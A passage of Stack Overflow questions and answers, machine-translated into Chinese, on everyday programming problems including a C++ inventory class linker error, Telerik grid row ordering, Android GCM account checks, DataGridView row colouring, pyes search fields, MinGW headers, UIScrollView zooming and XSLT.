    void displayInventory();
    void showInventory();
private:
    //Data members
   vector<string> inventory;
   vector<string>::iterator myIterator;
   vector<string>::const_iterator iter;
    };

#endif //INVENTORY_H 
```

**库存.cpp**

```
#include "Inventory.h"
#include <iostream>
#include <vector>   //  To enable the use of the vector class.
#include <string>

using namespace std;

Inventory::Inventory()
{

}

string Inventory :: add(string item)
{
inventory.push_back(item);
return item;
}

void Inventory:: showInventory()
{
char input[80];
    cin >> input;
    char inventoryRequest[] = "i";
    int invent = strcmp (input,inventoryRequest);
    //compare the player input to inventoryRequest (i) to see if they want to look at inventory.
    if(invent == 0)
    {
        displayInventory();
    }

}
void Inventory:: displayInventory()
{
//vector<string> inventory;
    cout<< "You have " << inventory.size() << " items.\n";
    cout << "\n******Inventory******";
    cout<< "\nYour items:\n";
    for (int i= 0; i< inventory.size(); ++i)
        cout<< inventory[i] << endl;
} 
```

**我想能够做什么：**

```
int main()
{
Inventory inventory;
inventory.push_back();

} 
```

**错误**

```
Error   2   error LNK2019: unresolved external symbol "public: class std::vector<class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >,class std::allocator<class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > > > & __thiscall Inventory::GetContainer(void)" (?GetContainer@Inventory@@QAEAAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@XZ) referenced in function _main   C:\Users\Conor\Documents\College\DKIT - Year 2 - Repeat\DKIT - Year 2 - Semester 1 - Repeat\Games Programming\MaroonedCA2\MaroonedCA2\Main.obj  MaroonedCA2
Error   3   error LNK1120: 1 unresolved externals   C:\Users\Conor\Documents\College\DKIT - Year 2 - Repeat\DKIT - Year 2 - Semester 1 - Repeat\Games Programming\MaroonedCA2\Debug\MaroonedCA2.exe MaroonedCA2 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:53:41.217

您可以从 std::vector 继承您的类：

```
class Inventory : public std::vector<std::string> {
   public:
      Inventory();
      void displayInventory();
      void showInventory();
      // [...] 
} 
```

然后在您的代码中，您应该能够执行以下操作：

```
int main()
{
    Inventory inv;
    inv.push_back("item 1");
    inv.push_back("item 2");
    for (Inventor::iterator it = inv.begin(); it != inv.end(); ++it)
           std::cerr << *it << ' ';
    std::cerr << std::endl;
} 
```

通过继承可以避免重新定义方法、迭代器等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:36:54.153

一个简单的解决方案是添加 a`push_back`和要复制到清单类的其他向量方法：

```
class Inventory
{
public:
    //Constructor
    Inventory();

    //Methods.
    std::string add(std::string item);
    void displayInventory();
    void showInventory();
    void push_back(const std::string& s) { inventory.push_back(s); }
private:
    //Data members
   std::vector<std::string> inventory;
   std::vector<std::string>::iterator myIterator;
   std::vector<std::string>::const_iterator iter;
}; 
```

请注意，**私有**继承`std::vector`也可能是一种选择。它不是 100% 安全的，但很难找到可能造成问题的场景。公开继承是绝对禁忌。这个例子展示了如何暴露部分`std::vector`私有继承的公共接口：

```
class Inventory : private std::vector<std::string>
{
 public:
  // make a selection of the vector's methods public for this class.
  using std::vector<std::string>::push_back;
  using std::vector<std::string>::pop_back;
  using std::vector<std::string>::begin;
  using std::vector<std::string>::end;
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:51:07.437

此代码段有许多问题/改进领域。但是，对于您询问的具体问题，请注意“push_back”不是 Inventory 类的成员函数。所以你得到了编译器错误。

您需要为此调用 inventory.add 。

# service - Apache Thrift 服务自动发现

> ID：13530391
> 
> 赞同：2
> 
> 时间：2012-11-23T13:46:30.603
> 
> 标签：service, thrift, service-discovery

我想使用 apache thrift 开发一些本地网络服务。应该有多个服务等待 ONE master 连接到它们并独占使用它们，直到 master 释放它们。这些服务以多种语言编写。

之所以选择使用 thrift，是因为我需要一些简单的远程过程调用机制来实现服务之间快速且支持多种语言的通信。虽然 thrift 对 RPC 有好处，但我需要一些机制来通过一些自动发现机制定位服务 TCP 地址和端口，然后才能在不硬连线地址的情况下相互连接 thrift 服务器/客户端。

我有哪些自动发现此类服务的可能性？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T19:55:15.013

没有什么可以插入到您的计划中。您可以使用 Apache ZooKeeper 构建类似的东西。Netflix 的 curator 在 ZooKeeper 之上提供了一套很好的工具来构建它。见[https://github.com/Netflix/curator](https://github.com/Netflix/curator)

# jquery - Telerik MVC 网格顶部的选定行

> ID：13530393
> 
> 赞同：0
> 
> 时间：2012-11-23T13:46:39.557
> 
> 标签：jquery, asp.net-mvc-3, telerik, telerik-grid, telerik-mvc

我有一个 Telerik MVC 网格，我希望将所选内容强制列在列表顶部。我正在为网格使用详细视图，因此它是可折叠和可扩展的。我将如何强制选定的行到列表的顶部？

**我的jQuery：**

```
function unit_onDetailViewExpand(e) {
    // Select the Grid
    var grid = $(this).data('tGrid');
    //Close all other rows
    grid.$rows().not(e.masterRow).each(function (index, row) {
        grid.collapseRow(row);
    });

    /* TODO: move row to the top, this hasn´t worked for me so far
    grid.reorderColumn(0, grid.columnFromTitle("Name"));
    $.telerik.trigger(grid.element, 'repaint');
    */
} 
```

谢谢大家:)

**####已编辑####**

这是我现在选择行时所做的：

```
function onRowSelect(e) {
    $(e.row).prependTo($(e.row).parent());
    var grid = $('#RentableUnits').data("tGrid");
    // get the first master table row
    var tr = $("#RentableUnits tbody > .t-master-row:eq(0)"); // use .t-master-row to select only the master rows

    // expand the row
    grid.expandRow(tr);
} 
```

现在我面临的问题是DetailedView 的内容没有移动。假设我选择了一行，该行移到顶部，扩展了该行，但前一行的内容仍在扩展。

我一直在查看[**文档**](http://www.telerik.com/help/aspnet-mvc/telerik-ui-components-grid-client-api-and-events.html#OnDetailViewExpand)，发现这与 detailRow 有关，但我不知道如何将它与我的 masterRow 一起移动。

有谁知道如何将详细视图的内容与行一起移动？

**#### 编辑（再次）####**

到目前为止，我已经将表格行移到列表的顶部，但是每次扩展特定行时，我都会不断获取原始顶行的内容（第二行的内容）。从我在 Firebug 中看到的是，在扩展 .t-master-row 之一之前，表中没有 .t-detail-row 。我是否应该与选定的行一起移动其他内容，我的意思是 masterRow 和有时是 detailRow 的其他内容？

（我还上传了图片以及显示来自 Firebug 的 HTML 的问题）

```
function onRowSelect(e) {
    var grid = $('#RentableUnits').data("tGrid");

    var selectedRow = $('#RentableUnits tbody>.t-state-selected');
    selectedRow.prependTo(selectedRow.parent());
    if (selectedRow.next().is('.t-detail-row')) {
        selectedRow.next().prependTo(selectedRow.parent());
    }
    selectedRow.prependTo(selectedRow.parent());

    // get the first master table row
    var tr = $("#RentableUnits tbody > .t-master-row:eq(0)"); // use .t-master-row to select only the master rows
    // expand the row
    grid.expandRow(tr);
} 
```

你给了我很大的帮助，也许我可以再来一次？:)

#

![页面加载，行是正确的](../Images/b44011da0520530d132449d7142935e0.png)

#

![选择的行并加载了错误的详细内容（与第一行相同）](../Images/a3279411f4d0119dc80a41f5dba5e3ab.png)

#

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T23:23:11.003

您可以在需要时使用以下脚本轻松地将所选行移动到顶部：

```
var selectedRow=  $('#GridName tbody>.t-state-selected'); 
selectedRow.prependTo(selectedRow.parent()) 
```

请注意，如果需要，您可以将选择器更改为更通用 - 使用类名或使用搜索上下文来查找选定的行。

或者您甚至可以使用**[onRowSelect](http://www.telerik.com/help/aspnet-mvc/telerik-ui-components-grid-client-api-and-events.html#OnRowSelect)**事件来执行您的逻辑，如下所示：

```
function onRowSelect(e){
    $(e.row).prependTo($(e.row).parent());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T12:16:39.353

Grid 组件具有基础数据。您还需要定位由选定行表示的数据项。

```
function on_RowSelect(e){

    var grid = $(e.target).data('tGrid');
    var $rows = grid.$rows();

    // move underlying data
    var rowIndex = $rows.index(e.row);
    grid.data.unshift(grid.data.splice(rowIndex,1)[0])

    // move rows
    var $selectedRows = $(e.row).add($(e.row).next('.t-detail-row'));
    $rows.parent().prepend($selectedRows);
} 
```

问候

# jquery - 动态加载页面不会重新绑定 JS 代码

> ID：13530396
> 
> 赞同：0
> 
> 时间：2012-11-23T13:46:49.420
> 
> 标签：jquery

我有这种情况。我动态加载`Page A`其中包含一些 JS 代码。在该页面内，我可以动态加载另一个页面 B（也可以通过使用`fadeOut`效果和`.remove()`函数来动态删除）

Page B 包含一个 jQUery 的 UI`datepicker`插件（以及一些其他插件）。

事情是这样的：如果我加载`Page B`，`datepicker`则正确初始化，但如果我删除它`Page B`并重新加载它，`datepicker`则不会初始化。为什么 ？

我正在使用该`.datepicker("destroy")`函数，然后`.datepicker({...})`在其中`Page B`但没有任何效果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:57:59.533

尝试像这样在 A js 中导入你的 B js：

```
$.getScript("yourOwnPath/theB.js", function() {
        }); 
```

# android - 如何在启动 GCM 程序之前检查用户谷歌帐户是否已添加到设备上？

> ID：13530397
> 
> 赞同：7
> 
> 时间：2012-11-23T13:46:57.263
> 
> 标签：android, notifications, google-cloud-messaging

有没有办法在启动 GCM 注册过程 API 8 之前检查用户是否在他的设备上添加了他的谷歌帐户？

当尝试在没有它的情况下注册时，应用程序会在关闭时发出警告，因此请先检查，提醒用户并关闭应用程序。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-24T13:38:30.233

我查看了 checkDevice() 的源代码，据我所知，它只检查 API 级别并且 gcm 包在设备上。因此，按照 CommonsWare 的建议，这段代码似乎为我完成了这项工作：

```
private boolean deviceHasGoogleAccount(){
        AccountManager accMan = AccountManager.get(this);
        Account[] accArray = accMan.getAccountsByType("com.google");
        return accArray.length >= 1 ? true : false;
} 
```

你需要这条线

```
 <uses-permission android:name="android.permission.GET_ACCOUNTS" /> 
```

在清单中

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-10T05:29:20.900

您需要验证从 GCM 获得的响应，如果您收到 ACCOUNT_MISSING 则您可以处理错误。

在你`GCMIntentService Class`的方法`onRegistered() onUnregistered() onMessage() onError()`中，在你的`onError()`方法中

```
/**
 * Method called on Error
 * */
@Override
public void onError(Context context, String errorId) {
    Log.i(TAG, "Received error: " + errorId);
    // HANDLE IF GCM SERVER SENT ERROR MESSAGES.!
} 
```

![在此处输入图像描述](../Images/7343aae41e0d8db3c49123e167fa75db.png)

有关错误处理的更多信息，请查看[文档](http://developer.android.com/google/gcm/gcm.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T19:01:59.470

关于如何捕获异常的问题：

```
try
{
    GCMRegistrar.checkDevice(context);
    System.out.println("Device has GCM capabilities. So registering for GCM");
   //// write code here to register for GCM
}
catch(Exception e)
{
    System.out.println("Cannot cregister for GCM");
} 
```

这是捕获异常的逻辑。因此，如果在 try 之后部分抛出任何异常，则部分在 catch 之后的代码将被执行。checkDevice() 抛出异常。如果您不捕获异常，应用程序将崩溃。

我也不认为语法都是正确的，但是这段代码会让你知道该怎么做。

# c# - 在 DataGridView 中更改行的颜色时，RowsAdded 事件产生了奇怪的行为

> ID：13530398
> 
> 赞同：1
> 
> 时间：2012-11-23T13:47:01.993
> 
> 标签：c#, .net, datagridview

我将 a 绑定`DataGridView`到（“付款”对象列表）集合，我正在使用`RowsAdded`事件根据付款状态更改行的背面颜色。我正在使用 ( `row.DefaultCellStyle.BackColor`) 更改背景颜色，但如果我更改了第一行的颜色，那么第二行的颜色也会更改，即使我没有更改其背景颜色。而且我不想将其背景颜色更改为（白色），因为有些列有自己的颜色。

```
private void dgvPayment_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
        {

            DataGridViewRow row = dgvPayment.Rows[e.RowIndex];
            Payment  lPayment = row.DataBoundItem as Payment;
            if (lPayment != null)
                if (lPayment.IsLocked)
                {
                    row.DefaultCellStyle.BackColor = Color.LightPink;
                    row.ReadOnly = true;
                }
        } 
```

如何解决这个问题？

[你可以在这里](http://www.c-sharpcorner.com/Forums/UploadFile/houssam11350/11232012083215AM/rowsaddedproblem.zip)下载源代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:57:39.873

rows added 事件的行为有些不可预测 - 对于这种网格操作，通常最好使用其他事件。

在这种情况下，使用`CellFormatting`事件：

```
void dataGridView1_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
{
    DataGridViewRow row = dgvPayment.Rows[e.RowIndex];
    Payment  lPayment = row.DataBoundItem as Payment;
    if (lPayment != null && lPayment.IsLocked)
    {                
        row.DefaultCellStyle.BackColor = Color.LightPink;
    }
    else
    {
        row.DefaultCellStyle.BackColor = Color.White;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T15:50:09.483

问题是当我将背景颜色设置为白色时，整行都会变成白色，我不想要这个，因为有一列有自己的背景颜色。

[如此处](https://stackoverflow.com/questions/4673894/datagridview-defaultcellstyle-rows-and-columns-priority)所述（datagridview-defaultcellstyle-rows-and-columns-priority）：

> 它可能是 DataGridViews 内部的东西，其中行样式显式地覆盖列样式，或者因为行样式应用于列样式之上。
> 
> 除了为第一行和第一列设置默认样式外，请尝试直接设置第一个单元格的样式，这将覆盖任何默认值，无论是行还是列。

所以我这样解决了；

```
private void dgvPayment_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
        {
            for (int index = e.RowIndex; index <= e.RowIndex + e.RowCount - 1; index++)
            {
                DataGridViewRow row = dgvPayment.Rows[index];
                Payment lPayment = row.DataBoundItem as Payment;
                if (lPayment != null && lPayment.IsLocked)
                {
                    row.DefaultCellStyle.BackColor = Color.Pink;
                    row.ReadOnly = true;
                }
                else
                {
                    row.DefaultCellStyle = null;
                    row.ReadOnly = false;
                }

            }
        } 
```

# ruby-on-rails - 设置自定义 id 会话

> ID：13530406
> 
> 赞同：-1
> 
> 时间：2012-11-23T13:47:37.220
> 
> 标签：ruby-on-rails, facebook

我可能有一些微不足道的问题，但我如何在 Rails 中设置自定义 ID 会话？我需要这个，因为 Apple 的 Safari 网络浏览器默认配置为阻止第三方 cookie，我需要一些解决方法来在我的 facebook 应用程序中传递会话变量。我想在 GET 变量中设置这个 id。

我有 session_store 的：active_record_store。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:48:56.800

You can directly access the session variable and store anything inside it. Session variable is a hash. So maybe you want to access it as `session[:id] = "value"`. I don't know if you are looking for this or something else.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:09:02.483

手动更改或设置 session_id 不是一个好主意。我建议使用 facebook cookie 对用户进行身份验证，然后您应该在每个请求中发送所有需要的参数。

[脸书饼干](https://developers.facebook.com/docs/reference/fql/cookies/)

# python - 在 pyes 查询中使用“字段”，在 0.19.1 上失败

> ID：13530408
> 
> 赞同：4
> 
> 时间：2012-11-23T13:47:39.653
> 
> 标签：python, elasticsearch, pyes

尝试在 pyes .search 中使用 fields=[...] 参数失败

这是一个简单的测试脚本来说明问题： http: [//pastebin.com/LiRMC3ib](http://pastebin.com/LiRMC3ib)

使用当前版本的 pyes 0.19.1，此脚本输出 {} 作为

```
print resultset[0] 
```

但是，使用我拥有的以前的“旧”不稳定 0.19.1 版本的 pyes - 0.19.1（不稳定）的结果

```
print resultset[0] 
```

是预期的：

```
{u'name': u'Joe Tester'} 
```

在 ES.get 调用中使用字段*确实*有效。

其他人看到这个或有一些关于发生了什么的指示吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-07-22T20:50:31.490

改写

```
resultset = ES.search(query=q, indices='oolong', fields=["name"]) 
```

至

```
resultset = ES.search(Search(q, fields=['name']), indices='oolong')) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-01T22:39:31.933

我在您的 pastebin 代码中注意到的一件事可能解释了意外行为 - 刷新（第 37 行）应该在搜索之前（第 36 行）。否则，如果文档已提交到索引，则存在竞争条件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:41:20.933

我在使用 pyes 0.19.1 时遇到了同样的问题，但我能够从结果集中检索单个字段。

替换这一行：

```
resultset = ES.search(query=q, indices='oolong', fields=["name"]) 
```

对此：

```
resultset = ES.search(query=q, indices='oolong', fields="name") 
```

这对我有用。我还没有弄清楚如何检索多个字段。当我将列表传递给*字段*时，它总是返回空字典。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-04T23:33:21.967

看一下：

```
class pyes.query.Search(...) 
```

在那里你可以设置一个字段数组。ES.search 上的字段不起作用。

```
es_connection = ES(server=[('http', 'localhost', '9200')])
q = Search(fields=['field1', 'field2'], .....)
resultset = es_connection.search(
    q,
    ....
) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-06-03T12:20:52.543

## 用这个

```
resultset = ES.search(query=q, indices='oolong', fields="name") 
```

或者如果您有多个领域的用途

```
resultset = ES.search(query=q, indices='oolong', fields="name,id") 
```

# java - Java EE 5 依赖注入？

> ID：13530409
> 
> 赞同：8
> 
> 时间：2012-11-23T13:47:41.460
> 
> 标签：java, jakarta-ee, dependency-injection, ejb-3.0, java-ee-5

由于 Java EE 5 没有 CDI，那么 DI 在这里如何工作？

可以在非 EJB 类中注入`@EJB`EJB 吗？可以在非 EJB 的类中`EntityManager`注入（容器管理的不是本地资源）吗？或者在非 EJB 类中引入资源的唯一解决方案是通过 JNDI 查找？`@PersistenceContext``EntityManager`

我所说的非 EJB 类是指没有用`@Stateless`/`@Statefull`或其他注释的类。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T14:28:54.280

取自：[http ://www.oracle.com/technetwork/articles/javaee/injection-141192.html](http://www.oracle.com/technetwork/articles/javaee/injection-141192.html)

> 请记住，Java EE 5 平台容器只有在用于容器管理的组件（例如 EJB bean、Servlet 和 JavaServer Pages (JSP) 技术标记处理程序）上时才能透明地处理注入。

onjava有一篇文章：[http ://onjava.com/pub/a/onjava/2006/01/04/dependency-injection-java-ee-5.html](http://onjava.com/pub/a/onjava/2006/01/04/dependency-injection-java-ee-5.html)

它提供了一个可读的表格，其中包含哪些托管组件（每个容器）支持注入什么类型的资源。

# c++ - 关于 TITLEBARINFO 的 MinGW 错误未声明

> ID：13530412
> 
> 赞同：0
> 
> 时间：2012-11-23T13:48:02.627
> 
> 标签：c++, windows, gcc, window, mingw

我正在使用最新的 MinGW：

```
MINGWBASEDIR=C:\mingw
gcc version 4.7.0 (GCC)
gcc version 4.7.0 (GCC)
GNU gdb (GDB) 7.5
GNU ld (GNU Binutils) 2.22
GNU windres (GNU Binutils) 2.22
GNU dlltool (GNU Binutils) 2.22
GNU Make 3.82.90
#define __MINGW32_VERSION 3.20
#define __W32API_VERSION 3.17 
```

这是源文件（test.cpp）：

```
#include <stdio.h>
#include <windows.h>

int main(int Argc,char** Args) {
  printf("%d",sizeof(TITLEBARINFO));
} 
```

这就是我编译它的方式：

```
g++ -c test.cpp 
```

这是MinGW报告的错误信息：

```
C:\temp>g++ -c test.cpp
test.cpp: In function 'int main(int, char**)':
test.cpp:5:22: error: 'TITLEBARINFO' was not declared in this scope 
```

TITLEBARINFO 应该在 windows.h 包含的 winuser.h 中声明。我在 mingw/include 目录中检查了这两个头文件，TITLEBARINFO 的定义确实存在。但是我仍然得到这个编译器错误，多么奇怪！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:02:07.227

`gcc -c -D_WIN32_WINDOWS=0x0410 test.cpp`

MinGW 显然默认为 0x0400。

# ios - 缩放UIScrollview可缩放后如何调整UILabel文本的大小

> ID：13530413
> 
> 赞同：2
> 
> 时间：2012-11-23T13:48:09.147
> 
> 标签：ios, uiscrollview, scrollview, zooming

我有一个可缩放的 UIScrollview，子视图是一个 UIView (viewTexto)，其中包含一个 UILabel (messageLabel)。

这是代码

```
- (UIView *)viewForZoomingInScrollView:(UIScrollView *)scrollViewtmp{

    return viewTexto;
}
-(void)scrollViewDidEndZooming:(UIScrollView *)scrollViewtmp withView:(UIView *)view atScale:(float)scale{

        messageLabel.contentScaleFactor=scale;

    [scrollView setContentSize:CGSizeMake(scrollView.frame.size.width, messageLabel.frame.origin.y + messageLabel.frame.size.heightt)];

    } 
```

用这段代码我可以放大，而且文字不模糊，没有水平滚动但是UILabel的尺寸仍然太大，所以被剪切了。我需要 UILabel 的宽度与开始时一样再次采用 scrollView 宽度。

我已经阅读了关于 SO 中 UIScrollViews 的任何问题，并找到了我所需要的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T16:56:16.937

OK, so finally I found the answer as Ismael suggested I had to adjust the width, the problem was to find the equation.

The way the scaling works and the width of the scrollview's subviews is not obvious at the beginning.

Once you scale a UIView in a scrollview, and you want to have the same width for it, you have to divide the width of the element by the scale.

That is to say that if your initial width was 600, once you scale you can think that the width has changed and you only have to resize it again to 600, but it is not true. 600 is going to be multiplied by the scale automatically. So the right answer would be to resize it to 600 / scale. Here we divide.

Now the code:

Everything happens in the method:

```
-(void)scrollViewDidEndZooming:(UIScrollView *)scrollViewtmp withView:(UIView *)view atScale:(float)scale{} 
```

The first thing was to get rid of the blurry fonts:

```
 messageLabel.contentScaleFactor=scale; 
```

In another method I saved the initial width of the UILabel messageLabel (inside scrollview), I called the variable "initialWidth", that was 600\. This is important, because I started using the current messageLabel width once in the scrollViewDidEndZooming method.

To readjust the width of the subviews of the scrollview to 600, we only have to divide the initial width by the zoomscale, and readjust the label:

```
[messageLabel setFrame:CGRectMake(0,0,(initialWidth/scale), messageLabel.frame.size.height)];
[messageLabel sizeToFit]; 
```

At this point, we have a scrollview that can be zoomed, with a Label that readjust the text to the initial width of the scrollview, we don't have horizontal scrollbars, but we have a problem, the vertical scrollbars have a wrong height: we can only scroll a part of the text.

This was a difficult second problem to solve. If you pass the messageLabel height to the contentsize, curiously it seems that it doesn'work, and even if I get a height multiplied by the scale in my NSLogs, it does not change the height of the scrolling, as if internally it was divided again. For example, if the initial height was 500, after scaling by 2, I get 1000 height, if I pass this value to the ContentSize it remains the same, as if it was divided again by 2.

So the solution was this time to multiply by the scale.

We only have to add this line:

```
 [scrollView setContentSize:CGSizeMake(scrollView.frame.size.width, (messageLabel.frame.origin.y+messageLabel.frame.size.height)*scale)]; 
```

As it is seen, the difficult part was to understand this mess with dividing or multiplying by the scale.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:58:10.680

缩放后，`contentSize`a的a`UIScrollView`按比例增加（originalContentSize * zoomScale），所以当你再次调整它时，它会变小

示例：你`scrollView.frame`的是 (0, 0, 100, 100)，你的`contentSize`是 (100, 100)。放大到 2.0 后，您`contentSize`将变为 (200, 200)。然后，您手动将其置于 (100, 100) 处，这等于 (50, 50) 的 a `contentSize`of (50, 50) 没有缩放。

从 ( `contentSize.width <= scrollView.frame.size.width`) 开始，将不会有水平滚动，并且标签的最右侧部分不可见。

尽量不要调整`contentSize`。然后可以滚动，并且用户可以到达整个标签

编辑：重新阅读您的问题，如果您希望标签在缩放后调整并完全可见，除了调整 , 之外，您还需要`contentSize`调整`messageLabel's`框架。标签应正确包裹自己

# xml - 如何使用 XSLT 获取输入字段值？

> ID：13530414
> 
> 赞同：1
> 
> 时间：2012-11-23T13:48:11.930
> 
> 标签：xml, xslt

我想使用下面的 XSLT 获取输入字段值是示例：

示例：[http ://www.w3schools.com/xsl/tryxslt.asp?xmlfile=cdcatalog&xsltfile=tryxsl_if](http://www.w3schools.com/xsl/tryxslt.asp?xmlfile=cdcatalog&xsltfile=tryxsl_if)

并将 xslt 代码替换为以下内容，

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!-- Edited by XMLSpy® -->
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
<xsl:template match="/">
  <html>
  <body>
    <input type="text" name="testTextBox" value="testValue"/>
    value here -->> <xsl:value-of select=".//x:TextBox[@Name = 'testTextBox']" />
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
      <th>Title</th>
      <th>Artist</th>
    </tr>
    <xsl:for-each select="catalog/cd">
    <xsl:if test="price>10">
      <tr>
        <td><xsl:value-of select="title"/></td>
        <td><xsl:value-of select="artist"/></td>
   </tr>
    </xsl:if>
    </xsl:for-each>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet> 
```

然后在下面你会看到输入字段 - 所以我的要求是这样的：

*   用户在输入字段中写的任何文本我都想在该输入字段前面使用 XLT 显示该值。

谢谢苏希尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:55:22.173

XSLT 不可能。您正在寻找的是 DOM，可能您应该使用 Javascript 之类的浏览器脚本！

```
<?xml version="1.0" encoding="iso-8859-1"?>
<!-- Edited by XMLSpy® -->
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <xsl:output method="html"/>
    <xsl:template match="/">
      <html>
        <head>
          <script language="javascript" type="text/javascript">
            function copytext()
            {
            document.getElementById("copytext").innerHTML=document.getElementById("inputText").value;
            }
          </script>
        </head>
        <body onload="copytext()">
          <input id="inputText" type="text" name="testTextBox" value="testValue" onkeydown="copytext()"/>
          value here -->> <span id="copytext"/>
          <h2>My CD Collection</h2>
          <table border="1">
            <tr bgcolor="#9acd32">
              <th>Title</th>
              <th>Artist</th>
            </tr>
            <xsl:for-each select="catalog/cd">
              <xsl:if test="price>10">
                <tr>
                  <td>
                    <xsl:value-of select="title"/>
                  </td>
                  <td>
                    <xsl:value-of select="artist"/>
                  </td>
                </tr>
              </xsl:if>
            </xsl:for-each>
          </table>
        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet> 
```

# matlab - 同一 Matlab 矩阵内的可变平滑级别

> ID：13530417
> 
> 赞同：2
> 
> 时间：2012-11-23T13:48:18.793
> 
> 标签：matlab, smoothing

我目前有一个`M`包含正值和负值的大矩阵（~100x100x50 元素）。目前，如果我想平滑这个矩阵，我使用该`smooth3`函数在整个 3-D 矩阵上应用高斯核。

我想要实现的是该矩阵内的可变平滑级别 - 即。根据类似的 3-D 矩阵中的值（值范围从 0 到 1），矩阵的不同部分`M`被平滑到不同级别的 sigma 。`d`其中`d`0 表示不进行平滑处理，其中`d`1 表示出现最大级别的平滑处理。

矩阵是 3-D 的事实是微不足道的。3 维平滑很好，但不是必需的，而且我当前的代码（执行各种其他操作）`M`无论如何都分别处理 50 个切片中的每一个。我很高兴用高斯函数`smooth3`的卷积代替，并在每个切片上单独执行此卷积。`M`我不知道如何改变这个高斯函数的 sigma 水平（基于`d`）给定它的位置`M`并相应地输出结果。

另一种方法可能是使用矩阵`d`作为一个非常平滑的矩阵版本的掩码，`Ms`并以某种方式操作`M`并`Ms`给出等效的结果，但是我不相信这会起作用，因为我想不出一个函数来组合`M`和`Md`不会给出每个`M`或`Ms`当 0 < `d`< 1 时的人工制品......有什么想法吗？

[我使用的是 2009b，只能访问信号处理工具箱。]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:56:30.037

你应该看看引导图像过滤器。它是双边滤波器的计算有效的推广。

[http://research.microsoft.com/en-us/um/people/jiansun/papers/guidedfilter_eccv10.pdf](http://research.microsoft.com/en-us/um/people/jiansun/papers/guidedfilter_eccv10.pdf)

它将允许您根据指导矩阵进行适当的平滑处理。

# php - 如何检查 Facebook 图形 API 请求是否已完成

> ID：13530418
> 
> 赞同：0
> 
> 时间：2012-11-23T13:48:24.147
> 
> 标签：php, facebook-graph-api

如何检查我是否收到了对以下图形 api 请求的回复？

```
 $abc=$facebook->api('/'.$userid); 
```

如果我收到错误，$abc 里面的键是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:29:00.640

> 如何检查我是否收到了对以下图形 api 请求的回复？

正如您在标题中所说，检查请求是否“完成”是没有实际意义的——PHP SDK API 调用是**同步**的，因此您的代码的执行总是“等待”直到收到来自 API 的响应。

> 如果我收到错误，$abc 里面的键是什么？

无 - 值将只是`null`。

当出现问题时，PHP SDK 会抛出**异常**——因此请熟悉如何使用`try { … } catch(…) { … }`语句块处理 PHP 中的异常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:55:29.340

我建议您阅读[入门：图形 API](https://developers.facebook.com/docs/getting-started/graphapi/)。[也可以使用Graph API Explorer](https://developers.facebook.com/tools/explorer/)尝试查询。如果您遇到错误，则取决于您的查询。例如，如果用户 ID 未知，您会收到以下输出：

```
 "error": {
      "message": "(#803) Some of the aliases you requested do not exist: XXXXXXXXXXXX",
      "type": "OAuthException",
      "code": 803
   } 
```

您应该检查“id”键是否已设置且不为空。

# c - 奇怪的显示窗口行为

> ID：13530421
> 
> 赞同：0
> 
> 时间：2012-11-23T13:48:38.200
> 
> 标签：c, windows, winapi

我在打电话时发现了一个窗口显示，`SetWindowPos`或者`MoveWindow`，我的意思是`WM_CREATE`在我有机会打电话之前在消息期间显示窗口`ShowWindow`。稍微查了一下，发现跟`SetWindowRedraw`.

这是一个例子：

```
#include <Windows.h>
#include <windowsx.h>

LRESULT CALLBACK MainWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
BOOL MainWindow_OnCreate(HWND hWnd, LPCREATESTRUCT lpCreateStruct);
void MainWindow_OnDestroy(HWND hWnd);
void MainWindow_OnSize(HWND hWnd, UINT state, int cx, int cy);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
  WNDCLASSEX wcex = { sizeof(wcex) };
